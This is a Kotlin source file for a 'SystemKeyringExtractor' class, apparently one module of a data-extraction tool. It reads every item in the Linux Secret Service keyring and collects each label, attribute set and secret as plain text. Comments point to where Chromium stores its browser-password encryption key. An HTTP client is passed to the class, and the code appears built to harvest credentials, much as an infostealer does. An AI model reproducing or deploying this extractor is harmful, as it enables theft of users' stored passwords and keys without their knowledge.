package net.kerner.entkerner.extractors.keyring

import io.ktor.client.*
import net.kerner.entkerner.abstract.AbstractDataExtractor
import net.kerner.entkerner.io.nullPaths
import org.freedesktop.dbus.DBusPath
import org.freedesktop.dbus.connections.impl.DBusConnectionBuilder
import org.freedesktop.dbus.types.Variant
import org.freedesktop.secret.Collection
import org.freedesktop.secret.Item
import org.freedesktop.secret.Service
import org.freedesktop.secret.Session
import org.freedesktop.secret.Static
import org.freedesktop.secret.Static.Algorithm
import org.freedesktop.secret.simple.SimpleCollection
import java.io.File

class SystemKeyringExtractor(
    httpClient: HttpClient
) : AbstractDataExtractor<List<KeyRingSecret>>(httpClient) {
    override val fileDirectories = nullPaths
    override val name = "SystemKeyringExtractor"

    // https://chromium.googlesource.com/chromium/src/+/refs/tags/113.0.5672.66/components/os_crypt/sync/os_crypt_linux.cc#30
    // https://github.com/chromium/chromium/blob/69d56645d95ab3201a2dc769dabc65d476b90c64/components/os_crypt/sync/os_crypt.h#L250
    // https://github.com/chromium/chromium/blob/69d56645d95ab3201a2dc769dabc65d476b90c64/components/os_crypt/sync/key_storage_linux.h#L42
    // https://github.com/chromium/chromium/blob/69d56645d95ab3201a2dc769dabc65d476b90c64/components/os_crypt/sync/key_storage_linux.cc#L249

    override suspend fun extractData(file: File): List<KeyRingSecret> {
        val items = mutableListOf<KeyRingSecret>()

        //val connection = DBusConnectionBuilder
        //    .forSessionBus()
        //    .withRegisterSelf(true)
        //    .build()
        //val service = Service(connection)
        //val isSupported = service.openSession(Algorithm.AES, Variant(""))
        //service.collections.forEach { collection ->
        //    Collection(collection, service).items.forEach {
        //        val item = Item(it, service)
        //        val secret = item.getSecret(service.session.path)
        //        val keyRingSecret = KeyRingSecret(secret.secretValue.toString(), secret.secretParameters.toString(), secret.contentType)
        //        items.add(KeyRingItem(item.id, item.label, keyRingSecret, item.serviceName, item.attributes))
        //    }
        //}
        val collection = SimpleCollection()
        for(itemString in collection.getItems(mapOf())) {
            val secret = collection.getSecret(itemString)
            val label = collection.getLabel(itemString)
            val secretModel = KeyRingSecret(label, itemString, String(secret), collection.getAttributes(itemString))
            items.add(secretModel)
        }
        return items
    }
}